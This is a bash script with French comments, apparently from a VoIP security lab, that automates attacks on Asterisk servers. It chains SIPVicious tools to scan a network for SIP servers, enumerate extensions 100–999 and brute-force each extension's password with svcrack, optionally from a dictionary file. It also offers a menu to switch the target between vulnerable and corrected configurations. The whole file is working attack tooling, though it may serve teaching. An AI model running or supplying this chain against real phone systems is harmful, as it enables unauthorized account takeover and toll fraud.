#!/bin/bash
	##################################
	#  Détection du serveur Asterisk #
	##################################
scan ()					# Fonction de détection du serveur
{ 
	if [[ $# > "0" && $1 == "auto" ]]; then		#
		auto=true					# Si "scan auto" alors rien l'utilisateur n'a rien à entré 
	else 							# 
		auto=false					# Si "scan" alors l'utilisateur entre les adresse à analyser.
	fi							#



	net=`ip route | cut -d " " -f 1 | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"`#Permet de déterminer le réseau sur lequel nous nous situons
	
	if [ $auto == true ]; then
		 plageScan=$net			# Si mode auto alors scan du réseau actuel
	
	elif [ $auto == false ]; then

		pasIP=true
		while [ $pasIP == true ]	# Boucle jusqu'à l'utilisateur entre une adresse correct 
		do
			echo ""
			echo -e "\tEntrez une plage réseau à analyser : "
			echo -e "\tExemple : 192.168.1.0/24"
			echo -e "\t\t192.168.1.0 (/24 par defaut)"
			echo -e "\tAppuyer sur Entrée pour utiliser votre réseau actuel => $net"
			echo ""

			read -p '[Authentification][Scan réseau]=>' plageScan
	
			if [ -z $plageScan ]; then  #Si l'utilisateur entre rien alors scan du réseau actuel
				plageScan=$net
				pasIP=false
	
			elif [[ "$plageScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{2} ]]; then #Si utilisateur entre une adresse CIDR alors scan ce la plage
				pasIP=false
	
			elif [[ "$plageScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then # Si utilisateur entre juste une IP alors ajout d'un masque en /24
				plageScan=$plageScan"/24"
				pasIP=false
			
			else
				echo "Ceci n'est pas une adresse de réseau !" #Si format inconnu alors redemandé
				pasIP=true
			fi
		done
	fi
	echo "Scan : "$plageScan
		
	svmap $plageScan > /tmp/voiphack/svmap	#Récupère le résultat du scan dans le fichier /tmp/voiphack/svmap
	cat /tmp/voiphack/svmap
	bind=`grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" /tmp/voiphack/svmap | cut -d '|' -f 2 | tr -d " "`	# Récupère l'IP et le port dans le résultat
	ip=`echo $bind | cut -d ":" -f 1`
	echo $ip > /tmp/voiphack/svmapip Récupère l'IP
}

	#####################################################
	#  Détection des extensions sur un serveur Asterisk #
	#####################################################

war () {
	if [[ $# > "0" && $1 == "auto" ]]; then
		auto=true
	else 						# Pareil que pour scan()
		auto=false
	fi

	
	if [ $auto == true ]; then					# Si le mode auto est utilisé 
		if [ ! -f "/tmp/voiphack/svmapip" ];then
			scan auto					# Si aucun scan a été lancé précédement alors lancement d'un scan auto 
		fi							# Détection du lancement d'un précedent scan par existance du fichier /tmp/voiphack/svmapip contenant le resultat de svmap
		 	ipScan=`cat /tmp/voiphack/svmapip`
		
	
	elif [ $auto == false ]; then

		pasIP=true
		while [ $pasIP == true ]
		do
			echo ""
			echo -e "\tEntrez une ip cible à analyser : "
			echo -e "\tExemple : 192.168.1.1"
			echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
			echo -e "\t Ou entrez \"list\" pour voir les ip disponible"
			echo ""

			read -p '[Authentification][Scan extension]=>' ipScan

			if [[ "$ipScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then	# SI une adresse IP alors scan des extension sur cette adresse IP
				pasIP=false
				echo $ipScan > /tmp/voiphack/svmapip

			elif [ -z $ipScan ]; then				 #Si rien est entré
				echo "Procédure de détection automatique"
				if [ ! -f "/tmp/voiphack/svmap" ];then		# Si aucun scan lancé précedemennt faie un scan auto
					scan auto
				fi
				ipScan=`cat /tmp/voiphack/svmapip`		#Récuperer l'IP maintenant récuperer
				if [ -n $ipScan ]; then				# On réussi à récuperer une chaine
					pasIP=false
					
				else						# on réussi pas
					echo "Pas d'ip détecter "
					pasIP=true
				fi
			
			elif [ $ipScan == "list" ]; then 			#si on écrit list, et qu'il connais l'adresse ip il nous l'affiche sinon il la cherche avec un scan auto
				if [ ! -f "/tmp/voiphack/svmap" ];then
					scan auto
				else
					cat /tmp/voiphack/svmap
				fi

			else
				echo "Ceci n'est pas une adresse IP !"
			fi
		done
	fi
	echo "Scan : "$ipScan
	svwar -e100-999 -m invite $ipScan --force > /tmp/voiphack/svwar
	cat /tmp/voiphack/svwar
	grep "reqauth" /tmp/voiphack/svwar | cut -d '|' -f 2 | tr -d " " > /tmp/voiphack/numList
	
}

	#################################################
	# Crackd'une extension sur un serveur Asterisk  #
	#################################################
crack () {
	pasIP=true
	while [ $pasIP == true ]
	do
		echo ""
		echo -e "\tEntrez une ip cible à analyser : "
		echo -e "\tExemple : 192.168.1.1"
		echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
		echo -e "\t Ou entrez \"list\" pour voir les ip disponible"
		echo ""

		read -p '[Authentification][Crack]=>' ipScan

		if [[ "$ipScan" =~ ([0-9]{1,3}\.){3}[0-9]{1,3} ]]; then		#Même principe que scan()
			pasIP=false
			echo $ipScan > /tmp/voiphack/svmapip

		elif [[ $ipScan == "list" ]]; then
			if [ ! -f "/tmp/voiphack/svmap" ];then	
				scan auto
			else
				cat /tmp/voiphack/svmap
			fi
					
		elif [ -z $ipScan ]; then
			echo "Procédure de détection automatique"
			if [ ! -f "/tmp/voiphack/svmapip" ];then	
				scan auto
			fi
			ipScan=`cat /tmp/voiphack/svmapip`
			if [ -n $ipScan ]; then
				pasIP=false

				echo "----------------------------------"
				echo -e "IP cible => $ipScan"
				echo -e "---------------------------------- \n"
				pasIP=false
					
			else
				echo "Pas d'ip détectée "
				pasIP=true
			fi

			
		else
			echo "Ceci n'est pas une adresse IP !"
		fi
	
	done
	pasNum=true
	while [ $pasNum == true ]
	do
		echo ""
		echo -e "\tEntrez une extension cible à attaquer : "
		echo -e "\tExemple : 301"
		echo -e "\tAppuyer sur Entrée pour lancer un scan automatique"
		echo -e "\t Ou entrez \"list\" pour voir les extension disponible"
		echo ""

		read -p '[Authentification][Crack]=>' numScan

		if let $numScan 2>/dev/null; then 		#Même principe que war()
			pasNum=false
			nbNum=1
		
		elif [[ $numScan == "list" ]]; then
			if [ ! -f "/tmp/voiphack/svwar" ];then	
				war auto
			else
				cat /tmp/voiphack/svwar
			fi			
		elif [ -z $numScan ]; then
			if [ ! -f "/tmp/voiphack/svwar" ];then	
				war auto
			fi
			pasNum=false
			nbNum=`cat /tmp/voiphack/numList | wc -l`	#Récuperation du nombre de numéro trouvé
		
		else
			echo "Ceci n'est pas un numero !"
		fi
	done
	if [ $nbNum -eq 1 ] ;then		#Si un seul numéro attaque du numéro sur l'adresse trouvé précedement				#
		echo "un seul numéro"
		echo "Scan : "$ipScan
		echo "Scan : "$numScan
		if [ -f /var/voiphack/list ];then				#Si un dictionnaire est disponible, l'utilisé
			svcrack $ipScan -u $numScan -d /var/voiphack/list
		else	
			svcrack $ipScan -u $numScan
		fi
	elif [ $nbNum -eq 0 ];then			
		echo "Pas de numéro trouvé"

	else				#Si plusieurs numéro alors attaque de tout les numéros 1 par 1 
		echo "plusieurs numéro"
		
		
		i=1
		while [[ $i -le $nbNum ]]
		do
			numScan=`sed -n $i'p' /tmp/voiphack/numList`		#Récupération des numéro dans le fichier résultat de war()
			
			if [ -f /var/voiphack/list ];then
				svcrack $ipScan -u $numScan -d /var/voiphack/list #Si un dictionnaire est disponible, l'utilisé
			else	
				svcrack $ipScan -u $numScan
			fi
			i=$(($i+1))
		done
		
	fi
}

rm -rf /tmp/voiphack	#Création de l'environnement temporaire
mkdir /tmp/voiphack


	
	############################################################
	#  Choix du mode de configuration faillible ou corrigé 	  #
	############################################################
		echo ""
		echo -e "\t\t\t[Authentification]"
		echo -e "\t\t\t   [Choix mode]"
		echo -e "\t\t[1] Faillible"
		echo -e "\t\t[2] Corrigé"
		echo -e "\t\t[q] Quitter"
		echo ""
								
		read -p '[Authentification]=>' choix
	
		case $choix in
			1) /var/voiphack/conf/sysupdate.sh bad;;
			2) /var/voiphack/conf/sysupdate.sh correct;;
			q) exit;;
		esac
	
while [ true ]
do
		############################################
		##Choix des différentes parti de l'attaque
		############################################
		
	echo ""
	echo -e "\t\t[Authentification]"
	echo -e "\t[1] Scan réseau"
	echo -e "\t[2] Scan des extensions disponible"
	echo -e "\t[3] Attaque d'une extension"
	echo -e "\t[q] Quitter"
	echo ""

	read -p '[Authentification]=>' choix
	
	case $choix in
		1) scan;;
		2) war;;
		3) crack;;
		q) exit;;
	esac
done



